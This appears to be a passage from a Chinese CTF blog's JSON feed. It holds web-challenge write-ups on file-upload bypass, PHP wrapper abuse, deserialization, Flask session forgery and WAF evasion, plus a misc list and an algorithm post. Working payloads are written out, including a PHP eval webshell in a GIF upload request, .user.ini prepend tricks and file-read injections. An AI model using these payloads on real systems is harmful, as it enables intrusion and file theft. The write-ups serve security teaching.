up","slug":"ctf-Write-up","permalink":"http://m0th.top/categories/ctf-Write-up/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"http://m0th.top/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"bool盲注","slug":"bool盲注","permalink":"http://m0th.top/tags/bool%E7%9B%B2%E6%B3%A8/"}]},{"title":"[MRCTF2020]你传你🐎呢","slug":"MRCTF2020-你传你马呢","date":"2021-03-04T09:33:20.000Z","updated":"2021-03-14T09:44:05.588Z","comments":true,"path":"2021/03/04/MRCTF2020-你传你马呢/","link":"","permalink":"http://m0th.top/2021/03/04/MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%E9%A9%AC%E5%91%A2/","excerpt":"很基础的双文件上传绕过,通过上传.htaccess使得全目录被当做php解析","text":"很基础的双文件上传绕过,通过上传.htaccess使得全目录被当做php解析 上传正常图片 被过滤，猜测可能后端在校验时对文件大小也进行校验，导致正常图片过不了 如题目，上传图片马试试 图片马上传成功 但是不解析 尝试上传.htaccess 成功解析， 查看disabled function 发现如下函数被过滤 pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld 基本过滤了命令执行所需函数，于是我们不进行命令执行仅仅进行文件读取 构造payload如下 12?M0th&#x3D;var_dump(scandir(&#39;&#x2F;&#39;)); 读取目录?M0th&#x3D;var_dump(file_get_contents(&#39;&#x2F;flag&#39;)); 读取flag","categories":[{"name":"ctf-Write up","slug":"ctf-Write-up","permalink":"http://m0th.top/categories/ctf-Write-up/"}],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"http://m0th.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"命令执行绕过","slug":"命令执行绕过","permalink":"http://m0th.top/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/"}]},{"title":"buuctf-misc的解题过程","slug":"buuctf-misc的解题过程","date":"2021-03-03T15:36:24.000Z","updated":"2021-03-14T10:14:59.065Z","comments":true,"path":"2021/03/03/buuctf-misc的解题过程/","link":"","permalink":"http://m0th.top/2021/03/03/buuctf-misc%E7%9A%84%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/","excerpt":"刷一些misc，buu走起","text":"刷一些misc，buu走起 签到签到题 flag{buu_ctf} 金三胖gif逐帧播放即可 flag{he11ohongke} 二维码很简单 binwalk发现隐藏其他文件 foremost分离出来 一个zip ziperello 爆破出密码 得到flag N种解决办法winhex打开发现是data://协议的数据 浏览器访问一下 扫描得到KEY{dca57f966e4e4e31fd5b15417da63269} 大白考点，png文件格式，winhex修改宽高 你竟然赶我走winhex 打开文件末尾就是flag 基础破解archpr破解rar密码 乌镇各种图010eidter打开 末尾就是flag","categories":[{"name":"ctf-Write up","slug":"ctf-Write-up","permalink":"http://m0th.top/categories/ctf-Write-up/"}],"tags":[{"name":"misc","slug":"misc","permalink":"http://m0th.top/tags/misc/"}]},{"title":"[ZJCTF 2019]NiZhuanSiWei","slug":"ZJCTF-2019-NiZhuanSiWei","date":"2021-02-28T13:20:04.000Z","updated":"2021-04-05T12:03:07.929Z","comments":true,"path":"2021/02/28/ZJCTF-2019-NiZhuanSiWei/","link":"","permalink":"http://m0th.top/2021/02/28/ZJCTF-2019-NiZhuanSiWei/","excerpt":"一道相对简单的绕过题，主要用到了一些php伪协议","text":"一道相对简单的绕过题，主要用到了一些php伪协议 0x01 前置知识一些常见的php伪协议 php://filter元封装器，设计用于数据流打开时的筛选过滤应用 1234resource&#x3D;&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流。read&#x3D;&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。write&#x3D;&lt;写链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。&lt;；两个链的筛选列表&gt; 任何没有以 read&#x3D; 或 write&#x3D; 作前缀 的筛选器列表会视情况应用于读或写链。 可选择采用多种过滤器（字符串/转换/压缩/加密） 常用payload用于读源码 1php://filter/read=convert.base64-encode/resource=upload.php php://inputphp://input 是个可以访问请求的原始数据的只读流,可以读取到post没有解析的原始数据, 将post请求中的数据作为PHP代码执行。因为它不依赖于特定的 php.ini 指令。 allow_url_fopen ：off/onallow_url_include：on 且enctype=“multipart/from-data” 时 php://input 无效 data://数据流封装器 data:资源类型;&lt;编码&gt;,内容 allow_url_fopen ：onallow_url_include：onphp 版本大于等于 php5.2 1http://127.0.0.1/xxx.php?a=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4= 0x02 解题过程wp 直接源码贴 12345678910111213141516171819&lt;?php $text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123; #利用data://协议绕过 echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file))&#123; echo &quot;Not now!&quot;; exit(); &#125;else&#123; include($file); //查看useless.php $password = unserialize($password); echo $password; &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 1http:&#x2F;&#x2F;8b5645ba-c840-468a-b33c-c48d8810e9b3.node3.buuoj.cn&#x2F;?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php 伪协议读出 useless的源码 12345678910111213&lt;?php class Flag&#123; //flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); &#125; &#125; &#125; ?&gt; 于是构造出 1http:&#x2F;&#x2F;8b5645ba-c840-468a-b33c-c48d8810e9b3.node3.buuoj.cn&#x2F;?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:%22Flag%22:1:&#123;s:4:%22file%22;s:8:%22flag.php%22;&#125;","categories":[{"name":"ctf-Write up","slug":"ctf-Write-up","permalink":"http://m0th.top/categories/ctf-Write-up/"}],"tags":[{"name":"bypass","slug":"bypass","permalink":"http://m0th.top/tags/bypass/"},{"name":"php伪协议","slug":"php伪协议","permalink":"http://m0th.top/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"}]},{"title":"[suctf2019]CheckIn","slug":"2019-CheckIn","date":"2021-02-27T06:50:43.000Z","updated":"2021-03-03T13:13:16.455Z","comments":true,"path":"2021/02/27/2019-CheckIn/","link":"","permalink":"http://m0th.top/2021/02/27/2019-CheckIn/","excerpt":"利用上传.user.ini 自动文件包含从而绕过一些文件上传利用限制","text":"利用上传.user.ini 自动文件包含从而绕过一些文件上传利用限制 0x01 前置知识.user.ini，它比.htaccess用的更广，不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法。 什么是 .user.ini?我们知道php.ini是php默认的配置文件，其中包括了很多php的配置，https://www.php.net/manual/zh/ini.list.php 配置模式定义分为了： PHP_INI_SYSTEM、PHP_MINI_PERDIR、PHP_INI_ALL、PHP_INI_USER 关于.user.ini文件官方解释为： 除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（[$_SERVER‘DOCUMENT_ROOT’] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。 在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。 也就是说.user.ini 相当于用户自定义的一个php.ini,但是只能修改可修改范围为 PHP_INI_PERDIR、PHP_INI_USER的配置 于是我们通过修改一些配置选项，借助.user.ini构造一个后门，我们关注一下php.ini 文档中的auto_append_file、auto_prepend_file 123456789auto_prepend_file stringSpecifies the name of a file that is automatically parsed before the main file. The file is included as if it was called with the require function, so include_path is used.The special value none disables auto-prepending.auto_append_file stringSpecifies the name of a file that is automatically parsed after the main file. The file is included as if it was called with the require function, so include_path is used.The special value none disables auto-appending. 官方文档解释如上，auto_prepend_file 用于在脚本解析开始处包含文件，auto_append_file 用于在脚本解析最后后包含文件，且如果脚本中含有exit(),则不发生，于是我们可以调此配置包含本不会被解析的图片马 1auto_prepend_file&#x3D;x.png 0x02 wp 最典型不过的文件包含 上传.user.ini 后上传webshell即可 1234567891011121314151617181920212223242526POST /index.php HTTP/1.1Host: ad475845-4d19-4b6a-add8-d32bfdf8171d.node3.buuoj.cnContent-Length: 352Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://ad475845-4d19-4b6a-add8-d32bfdf8171d.node3.buuoj.cnContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryo5STsLcEm8W4O0oiUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://ad475845-4d19-4b6a-add8-d32bfdf8171d.node3.buuoj.cn/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: UM_distinctid=177f24714762d6-07ad73289ec17-53e356a-144000-177f24714776fdConnection: close------WebKitFormBoundaryo5STsLcEm8W4O0oiContent-Disposition: form-data; name=&quot;fileUpload&quot;; filename=&quot;x.png&quot;Content-Type: image/pngGIF89a&lt;script language=&#x27;php&#x27;&gt;@eval($_GET[M0th]);phpinfo();&lt;/script&gt;------WebKitFormBoundaryo5STsLcEm8W4O0oiContent-Disposition: form-data; name=&quot;upload&quot;鎻愪氦------WebKitFormBoundaryo5STsLcEm8W4O0oi--","categories":[{"name":"ctf-Write up","slug":"ctf-Write-up","permalink":"http://m0th.top/categories/ctf-Write-up/"}],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"http://m0th.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"bypass","slug":"bypass","permalink":"http://m0th.top/tags/bypass/"}]},{"title":"[HCTF 2018]admin","slug":"HCTF-2018-admin","date":"2021-02-24T08:33:24.000Z","updated":"2021-03-14T10:25:58.933Z","comments":true,"path":"2021/02/24/HCTF-2018-admin/","link":"","permalink":"http://m0th.top/2021/02/24/HCTF-2018-admin/","excerpt":"","text":"0x01简单分析题目一个登入框，一个注册框 注册一个test账户进行测试 查看源代码发现 于是猜测越权漏洞，即登入admin账户，而且登入后多了一些功能 在更改密码处 发现了源码地址 于是我们得到了源代码，发现其基于python flask 开发 0x02 源码分析123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108#!/usr/bin/env python# -*- coding:utf-8 -*-from flask import Flask, render_template, url_for, flash, request, redirect, session, make_responsefrom flask_login import logout_user, LoginManager, current_user, login_userfrom app import app, dbfrom config import Configfrom app.models import Userfrom forms import RegisterForm, LoginForm, NewpasswordFormfrom twisted.words.protocols.jabber.xmpp_stringprep import nodeprepfrom io import BytesIOfrom code import get_verify_code@app.route(&#x27;/code&#x27;)def get_code(): image, code = get_verify_code() # 图片以二进制形式写入 buf = BytesIO() image.save(buf, &#x27;jpeg&#x27;) buf_str = buf.getvalue() # 把buf_str作为response返回前端，并设置首部字段 response = make_response(buf_str) response.headers[&#x27;Content-Type&#x27;] = &#x27;image/gif&#x27; # 将验证码字符串储存在session中 session[&#x27;image&#x27;] = code return response@app.route(&#x27;/&#x27;)@app.route(&#x27;/index&#x27;)def index(): return render_template(&#x27;index.html&#x27;, title = &#x27;hctf&#x27;)@app.route(&#x27;/register&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])def register(): if current_user.is_authenticated: #当前用户存在，重定向到index return redirect(url_for(&#x27;index&#x27;)) form = RegisterForm() if request.method == &#x27;POST&#x27;: name = strlower(form.username.data) #将username通过strlower函数小写转换至name if session.get(&#x27;image&#x27;).lower() != form.verify_code.data.lower(): #从session中取出验证码进行校验 flash(&#x27;Wrong verify code.&#x27;) return render_template(&#x27;register.html&#x27;, title = &#x27;register&#x27;, form=form) if User.query.filter_by(username = name).first(): flash(&#x27;The username has been registered&#x27;) return redirect(url_for(&#x27;register&#x27;)) user = User(username=name) user.set_password(form.password.data) db.session.add(user) db.session.commit() flash(&#x27;register successful&#x27;) return redirect(url_for(&#x27;login&#x27;)) return render_template(&#x27;register.html&#x27;, title = &#x27;register&#x27;, form = form)@app.route(&#x27;/login&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])def login(): if current_user.is_authenticated: #当前用户登入，重定向到index return redirect(url_for(&#x27;index&#x27;)) form = LoginForm() if request.method == &#x27;POST&#x27;: name = strlower(form.username.data) #strlower函数进行转换 session[&#x27;name&#x27;] = name user = User.query.filter_by(username=name).first() if user is None or not user.check_password(form.password.data): #如果用户不存在或者密码不正确 flash(&#x27;Invalid username or password&#x27;) return redirect(url_for(&#x27;login&#x27;)) login_user(user, remember=form.remember_me.data) #登入用户 return redirect(url_for(&#x27;index&#x27;)) #重定向至index return render_template(&#x27;login.html&#x27;, title = &#x27;login&#x27;, form = form)@app.route(&#x27;/logout&#x27;)def logout(): logout_user() return redirect(&#x27;/index&#x27;)@app.route(&#x27;/change&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])def change(): if not current_user.is_authenticated: #当前用户未登入，定向至login return redirect(url_for(&#x27;login&#x27;)) form = NewpasswordForm() if request.method == &#x27;POST&#x27;: name = strlower(session[&#x27;name&#x27;]) #经过了strlower函数进行了大小写转换 user = User.query.filter_by(username=name).first() user.set_password(form.newpassword.data) db.session.commit() flash(&#x27;change successful&#x27;) return redirect(url_for(&#x27;index&#x27;)) return render_template(&#x27;change.html&#x27;, title = &#x27;change&#x27;, form = form)@app.route(&#x27;/edit&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])def edit(): if request.method == &#x27;POST&#x27;: flash(&#x27;post successful&#x27;) return redirect(url_for(&#x27;index&#x27;)) return render_template(&#x27;edit.html&#x27;, title = &#x27;edit&#x27;)@app.errorhandler(404)def page_not_found(error): title = unicode(error) message = error.description return render_template(&#x27;errors.html&#x27;, title=title, message=message)def strlower(username): username = nodeprep.prepare(username) #这个strlower转换函数写的很有意思 return username 0x03 解法1 unicode欺骗经过百度谷歌搜索发现nodeprep.prepare存在unicode漏洞，对于以下字母 会得到的结果是ABCDEFGHIJKLMNOP等大写字母 nodeprep.prepare会进行ᴀ -&gt; A -&gt; a 于是构造攻击链: 注册用户ᴀdmin 相当于注册Admin 登入Admin后修改密码相当于修改了admin的密码 因为 无论是注册 登录 还是修改密码都会调用一次strlower()函数 0x04 解法2 session伪造根据P神的文章:https://www.leavesongs.com/PENETRATION/client-session-security.html 我们知道python_flask 将 session保存在cookie中 我们根据https://github.com/noraj/flask-session-cookie-manager 解一下测试账户的cookie 1&#123;&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;e3fcc1fd987f5faab9d0ee5fda855893be4d89bc8e4f787d17271a2c2c28889d6aac7de47f9b19399bf08298d047e471a0ef98d020a33e729ad36e137b1dec7c&#39;, &#39;csrf_token&#39;: b&#39;55784b1b7c52107000f67dfea5625d19d506d793&#39;, &#39;name&#39;: &#39;test&#39;, &#39;user_id&#39;: &#39;10&#39;&#125; 我们在知道secret_key的情况下可以伪造admin，secret_key在config.py中 于是我们构造 1&#39;&#123;&quot;_fresh&quot;:true,&quot;_id&quot;:&#123;&quot; b&quot;:&quot;ZTNmY2MxZmQ5ODdmNWZhYWI5ZDBlZTVmZGE4NTU4OTNiZTRkODliYzhlNGY3ODdkMTcyNzFhMmMyYzI4ODg5ZDZhYWM3ZGU0N2Y5YjE5Mzk5YmYwODI5OGQwNDdlNDcxYTBlZjk4ZDAyMGEzM2U3MjlhZDM2ZTEzN2IxZGVjN2M&#x3D;&quot;&#125;,&quot;csrf_token&quot;:&#123;&quot; b&quot;:&quot;NTU3ODRiMWI3YzUyMTA3MDAwZjY3ZGZlYTU2MjVkMTlkNTA2ZDc5Mw&#x3D;&#x3D;&quot;&#125;,&quot;name&quot;:&quot;admin&quot;,&quot;user_id&quot;:&quot;10&quot;&#125;&#39; 伪造成功 1.eJw9kMtuwjAQRX-lmjUL6sQbJBapnEZZjCOQA5rZoDaE5mFTKQkKMeLf63bR_dxzz50HnC5DPTawmYZbvYJTe4bNA14-YQNstCOBd3Y7Waiz00du6JhLVm-WzcFxlsbalHFhdMtm3xfKtuQbqzOKwn2Pplq0f2_Q4UI-jwv1FbK_DIw4K9dakKQuleh7SY7mQuWyyHazVmerVXUnE3q6PmaVLJilHkUZYWcbVijYpF6L_M7ZodMCt_BcQTUOl9P03dfX_wlBL6jsWzzmEflyQZNEqJKZOwoKbMmUArtDULW9NolgVUmct3-464erA2KqxwlWcBvr4e858LqG5w-vGWQP.YD4iqQ.MevnBxrmcKjysXg7dvwI5MbJTTY 12345678moth@DESKTOP-S6G2ROG MINGW64 /f/ctf/有用的脚本/Flask Session Cookie Decoder or Encoder/flask-session-cookie-manager-master$ python3 flask_session_cookie_manager3.py decode -c &#x27;.eJw9kMtuwjAQRX-lmjUL6sQbJBapnEZZjCOQA5rZoDaE5mFTKQkKMeLf63bR_dxzz50HnC5DPTawmYZbvYJTe4bNA14-YQNstCOBd3Y7Waiz00du6JhLVm-WzcFxlsbalHFhdMtm3xfKtuQbqzOKwn2Pplq0f2_Q4UI-jwv1FbK_DIw4K9dakKQuleh7SY7mQuWyyHazVmerVXUnE3q6PmaVLJilHkUZYWcbVijYpF6L_M7ZodMCt_BcQTUOl9P03dfX_wlBL6jsWzzmEflyQZNEqJKZOwoKbMmUArtDULW9NolgVUmct3-464erA2KqxwlWcBvr4e858LqG5w-vGWQP.YD4g1A.pYCCUo84nblfygDJ7Km0KFgYeb8&#x27; -s &#x27;ckj123&#x27;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;e3fcc1fd987f5faab9d0ee5fda855893be4d89bc8e4f787d17271a2c2c28889d6aac7de47f9b19399bf08298d047e471a0ef98d020a33e729ad36e137b1dec7c&#x27;, &#x27;csrf_token&#x27;: b&#x27;55784b1b7c52107000f67dfea5625d19d506d793&#x27;, &#x27;name&#x27;: &#x27;test&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;moth@DESKTOP-S6G2ROG MINGW64 /f/ctf/有用的脚本/Flask Session Cookie Decoder or Encoder/flask-session-cookie-manager-master$ python3 flask_session_cookie_manager3.py encode -t &quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;e3fcc1fd987f5faab9d0ee5fda855893be4d89bc8e4f787d17271a2c2c28889d6aac7de47f9b19399bf08298d047e471a0ef98d020a33e729ad36e137b1dec7c&#x27;, &#x27;csrf_token&#x27;: b&#x27;55784b1b7c52107000f67dfea5625d19d506d793&#x27;, &#x27;name&#x27;: &#x27;test&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;&quot; -s &#x27;ckj123&#x27;.eJw9kMtuwjAQRX-lmjUL6sQbJBapnEZZjCOQA5rZoDaE5mFTKQkKMeLf63bR_dxzz50HnC5DPTawmYZbvYJTe4bNA14-YQNstCOBd3Y7Waiz00du6JhLVm-WzcFxlsbalHFhdMtm3xfKtuQbqzOKwn2Pplq0f2_Q4UI-jwv1FbK_DIw4K9dakKQuleh7SY7mQuWyyHazVmerVXUnE3q6PmaVLJilHkUZYWcbVijYpF6L_M7ZodMCt_BcQTUOl9P03dfX_wlBL6jsWzzmEflyQZNEqJKZOwoKbMmUArtDULW9NolgVUmct3-464erA2KqxwlWcBvr4e858LqG5w-vGWQP.YD4iqQ.MevnBxrmcKjysXg7dvwI5MbJTTY","categories":[{"name":"ctf-Write up","slug":"ctf-Write-up","permalink":"http://m0th.top/categories/ctf-Write-up/"}],"tags":[{"name":"unicode欺骗","slug":"unicode欺骗","permalink":"http://m0th.top/tags/unicode%E6%AC%BA%E9%AA%97/"},{"name":"session伪造","slug":"session伪造","permalink":"http://m0th.top/tags/session%E4%BC%AA%E9%80%A0/"}]},{"title":"hgame2021做题笔记","slug":"hgame2021做题笔记","date":"2021-02-21T14:17:36.000Z","updated":"2021-02-21T14:21:52.012Z","comments":true,"path":"2021/02/21/hgame2021做题笔记/","link":"","permalink":"http://m0th.top/2021/02/21/hgame2021%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/","excerpt":"hgame2021,跟着做做，巩固所学，顺便看看有什么新东西","text":"hgame2021,跟着做做，巩固所学，顺便看看有什么新东西 WEEK1 web–Hitchhiking_in_the_Galaxy 考点是http协议的一些基本点如User-Agent、Referer、X-Forwarded-For等 12345678910POST /HitchhikerGuide.php HTTP/1.1Host: hitchhiker42.0727.site:42420User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Infinite Improbability Drive/83.0Referer: https://cardinal.ink/Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1X-Forwarded-For: 127.0.0.1 web–","categories":[{"name":"ctf-Write up","slug":"ctf-Write-up","permalink":"http://m0th.top/categories/ctf-Write-up/"}],"tags":[{"name":"ctf-web","slug":"ctf-web","permalink":"http://m0th.top/tags/ctf-web/"}]},{"title":"算法入门--跳到平方根之查找","slug":"算法入门-跳到平方根之查找","date":"2021-02-18T03:21:00.000Z","updated":"2021-02-18T08:16:10.842Z","comments":true,"path":"2021/02/18/算法入门-跳到平方根之查找/","link":"","permalink":"http://m0th.top/2021/02/18/%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8-%E8%B7%B3%E5%88%B0%E5%B9%B3%E6%96%B9%E6%A0%B9%E4%B9%8B%E6%9F%A5%E6%89%BE/","excerpt":"浮点数和算数、面向连续域的折半查找和面向离散域的二分搜索","text":"浮点数和算数、面向连续域的折半查找和面向离散域的二分搜索 0x01 迭代查找已知数字n是完全平方数，尝试从1开始求平方，如果平方小于n，则递增到2，以此类推，直至找到平方根a使其满足 a的平方等于后退出 1234567891011121314151617def findSquareRoot(x): if x&lt;0: print(&#x27;sorry,no imaginary numbers!&#x27;) return ans=0 while ans**2&lt;x: ans=ans+1 if ans**2 !=x: print(x,&#x27;is not a perfect square&#x27;) print(&#x27;square root of &#x27;+ str(x)+&#x27; is close to&#x27;+str(ans-1)) else: print(&#x27;Square root of &#x27;+ str(x)+&#x27; is &#x27;+str(ans))if __name__==&quot;__main__&quot;: findSquareRoot(65536) findSquareRoot(65535) 然而我们发现 显然这并不正确，65535的平方根应该更接近256才对，于是我们优化一下，引入了小数，并且引入了更小的增量相比于1 1234567891011121314151617181920def findSquareRootWithinError(x,epsilion,increment): if x &lt; 0: print(&#x27;Sorry,no imaginary numbers!&#x27;) return 0 numGuesses = 0 ans = 0.0 while x - ans**2 &gt; epsilion: ans += increment numGuesses+=1 print(&#x27;numGuesses = &#x27;,numGuesses) if abs(x-ans **2 )&gt;epsilion: print(&quot;Falied on Square root of&quot;,x) else: print(ans,&#x27;is close to square root of&#x27;, x)if __name__==&quot;__main__&quot;: findSquareRootWithinError(65535,.01,.001) findSquareRootWithinError(65535,.01,.0001) findSquareRootWithinError(65535,.01,.00001) 1234567E:\\vscode\\python&gt; e: &amp;&amp; cd e:\\vscode\\python &amp;&amp; cmd /C &quot;D:\\python38\\python3.exe c:\\Users\\moth\\.vscode\\extensions\\ms-python.python-2021.2.576481509\\pythonFiles\\lib\\python\\debugpy\\launcher 59895 -- e:\\vscode\\python\\跳到平方根\\1.py &quot;numGuesses = 255999Falied on Square root of 65535numGuesses = 2559981Falied on Square root of 65535numGuesses = 25599803255.99803007005775 is close to square root of 65535 然而这个算法中，我们发现对于increment偏大的情况很容易不成功，具体原因是因为 因为a**2 - (a-1)**2是逐渐增大的，从而会造成出现上述情况，我们只能通过调小increment的值从而得到结果 但是调小increment意味着计算次数特别大，比如上面测试的数据 进行了25599803次计算，才得到结果 0x02 折半查找为了优化上述算法，我们可以找到一个ans值，测试如果 ans**2&gt;x，那么就不需要检查大于ans的猜测，同样测试如果 ans**2&lt;x，那么就不需要检查小于ans的猜测。所以在上述情况中，我们可以缩小范围为[0,ans]和[ans,x]。当我们已得到 范围[0,ans]和[ans,x],从两个极值中取中间值是比较合理的 1234567891011121314151617181920def bisectionSearchForSquareRoot(x, epslion): if x &lt; 0: print(&#x27;Sorry,imaginary numbers are out of &#x27;, x) numGuesses = 0 low = 0.0 high = x ans = (low + high) / 2.0 while abs(ans**2 - x) &gt;= epslion: if ans**2 &lt; x: low = ans else: high = ans ans = (high + low) / 2.0 numGuesses += 1 print(&#x27;numGuesses =&#x27;, numGuesses) print(ans, &#x27;is close to square root of&#x27;, x)if __name__ == &quot;__main__&quot;: bisectionSearchForSquareRoot(65535,.01) 极大地提高了程序的效率 0x03 二分搜索对连续变量做折半查找的思路，与离散变量的二分搜索密切相关，接下来我们看一下二分搜索 12345678910111213141516def bsearch(value,L): NOTFOUND=-1 lo,hi=0,len(L)-1 while lo&lt;= hi: mid=(lo +hi)&gt;&gt;1 if L[mid]&lt;value: lo =mid +1 elif value &lt;L[mid]: hi = mid -1 else: return mid return NOTFOUNDif __name__==&#x27;__main__&#x27;: Ls=[1,2,3,4,5,6,7,10,14,15,35,76,88,93] print(bsearch(8,Ls))","categories":[{"name":"用python解决算法谜题","slug":"用python解决算法谜题","permalink":"http://m0th.top/categories/%E7%94%A8python%E8%A7%A3%E5%86%B3%E7%AE%97%E6%B3%95%E8%B0%9C%E9%A2%98/"}],"tags":[{"name":"算法入门","slug":"算法入门","permalink":"http://m0th.top/tags/%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8/"}]},{"title":"[RoarCTF 2019]Easy Calc","slug":"RoarCTF-2019-Easy-Calc","date":"2021-02-10T13:44:35.000Z","updated":"2021-02-10T14:51:54.638Z","comments":true,"path":"2021/02/10/RoarCTF-2019-Easy-Calc/","link":"","permalink":"http://m0th.top/2021/02/10/RoarCTF-2019-Easy-Calc/","excerpt":"这个题的考察的知识点是php字符串解析特性，或者http走私漏洞","text":"这个题的考察的知识点是php字符串解析特性，或者http走私漏洞 php字符串解析漏洞:label: php需要将所有参数转换为有效的变量名，在解析查询字符串时，会做两件事 删除空白符 将某些字符转换为下划线 (空格、[、]等) HTTP走私攻击 http走私漏洞成因本质是前端服务器(CDN)和后端服务器接收数据的处理方式不同步 类型如下： CL.TE：前端服务器使用Content-Length标头，而后端服务器使用Transfer-Encoding标头。 TE.CL：前端服务器使用Transfer-Encoding标头，而后端服务器使用Content-Length标头。 TE.TE：前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过对标头进行某种方式的混淆来诱导其中一台服务器不对其进行处理。 详细参考：https://xz.aliyun.com/t/6654#toc-7 0x01 分析题目 每次计算进行了一次对结果的get请求 burp抓包改包测试 得到源码 123456789101112131415&lt;?phperror_reporting(0);if(!isset($_GET[&#x27;num&#x27;]))&#123; show_source(__FILE__);&#125;else&#123; $str = $_GET[&#x27;num&#x27;]; $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;,&#x27;\\$&#x27;,&#x27;\\\\&#x27;,&#x27;\\^&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $str)) &#123; die(&quot;what are you want to do?&quot;); &#125; &#125; eval(&#x27;echo &#x27;.$str.&#x27;;&#x27;);&#125;?&gt; 显然存在php代码执行漏洞 然而测试phpinfo()并不成功,应该存在waf 0x02 利用php字符串解析漏洞bypass waf 查看php中禁掉的函数 好家伙，我特么直接好家伙.jpg 还好 还有 file_get_content()、scandir() 并未过滤 还有个黑名单，最终 ?%20num=1;var_dump(scandir(chr(47))) ?%20num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) 此外还可用 dechex() 函数：把十进制转换为十六进制。 hex2bin() 函数：把十六进制值的字符串转换为 ASCII 字符。 readfile() 函数：输出一个文件写入缓冲区。 base_convert() 函数：在任意进制间转换数字 0x03利用http走私攻击完成绕过我们采用 cl-cl型绕过","categories":[{"name":"ctf-Write 